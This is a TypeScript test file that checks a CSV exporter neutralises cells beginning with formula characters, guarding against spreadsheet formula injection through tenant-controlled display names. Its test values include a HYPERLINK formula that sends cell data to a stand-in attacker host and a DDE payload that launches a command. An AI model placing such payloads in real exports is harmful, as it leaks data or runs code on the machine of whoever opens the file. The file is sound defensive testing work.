// A CSV cell that starts with a formula character is executed by the
// spreadsheet that opens it.
//
// Every value in IAMAI's CSVs is a tenant display name, sign-in address or
// department, and in a default Entra tenant any member can create a group and
// any guest sets their own display name. The exports go to an admin opening the
// recipient list in Excel to work a mail merge (audit redact-01,
// untrusted-content-rendering-01). Each lead character is tested separately,
// because a regex that covers four of six is the shape this bug takes.
import assert from 'node:assert/strict'
import test from 'node:test'
import { toCsv } from './format.ts'

const LEADS: { name: string; char: string }[] = [
  { name: 'equals', char: '=' },
  { name: 'plus', char: '+' },
  { name: 'minus', char: '-' },
  { name: 'at', char: '@' },
  { name: 'tab', char: '\t' },
  { name: 'carriage return', char: '\r' },
]

for (const { name, char } of LEADS) {
  test(`a cell beginning with ${name} is quoted as text`, () => {
    const payload = `${char}HYPERLINK("https://evil.example/?d="&A1,"ok")`
    const csv = toCsv(['Name'], [[payload]])
    const body = csv.split('\r\n')[1]
    // The apostrophe has to be the first character of the field. When the value
    // also needs RFC4180 quoting, that means immediately inside the quote.
    assert.ok(
      body.startsWith(`'${char}`) || body.startsWith(`"'${char}`),
      `${name} was not neutralised: ${JSON.stringify(body)}`,
    )
  })
}

test('a leading formula character is caught in every column, not just the first', () => {
  const csv = toCsv(['A', 'B', 'C'], [['safe', '=1+1', '@SUM(A1)']])
  const body = csv.split('\r\n')[1]
  assert.equal(body, `safe,'=1+1,'@SUM(A1)`, body)
})

test('the real attack shape from the audit', () => {
  // A group display name any tenant member can set, landing in recipients-*.csv.
  const csv = toCsv(['Name', 'Sign-in name', 'Department'], [['=cmd|\'/c calc\'!A1', 'a@b.example', 'Finance']])
  assert.ok(!csv.includes('\n=cmd'), 'the payload is still the first character of a cell')
  assert.ok(csv.includes(`'=cmd`), `not neutralised: ${csv}`)
})

test('ordinary values are untouched', () => {
  const csv = toCsv(['Name'], [['Priya Nair'], ['Sales — EMEA'], ['3 of 12'], [42], [null], [undefined]])
  const rows = csv.split('\r\n').slice(1)
  assert.deepEqual(rows, ['Priya Nair', 'Sales — EMEA', '3 of 12', '42', '', ''])
})

test('a formula character elsewhere in the value is left alone', () => {
  // Only the leading position starts a formula; rewriting mid-string would
  // corrupt ordinary names like "R&D - EMEA".
  const csv = toCsv(['Name'], [['R&D - EMEA'], ['Q1=Q2 review']])
  assert.deepEqual(csv.split('\r\n').slice(1), ['R&D - EMEA', 'Q1=Q2 review'])
})

test('quoting and escaping still work alongside the guard', () => {
  const csv = toCsv(['Name'], [['=a,b'], ['say "hi"'], ['two\nlines']])
  const rows = csv.split('\r\n')
  assert.equal(rows[1], `"'=a,b"`, rows[1])
  assert.equal(rows[2], `"say ""hi"""`, rows[2])
})
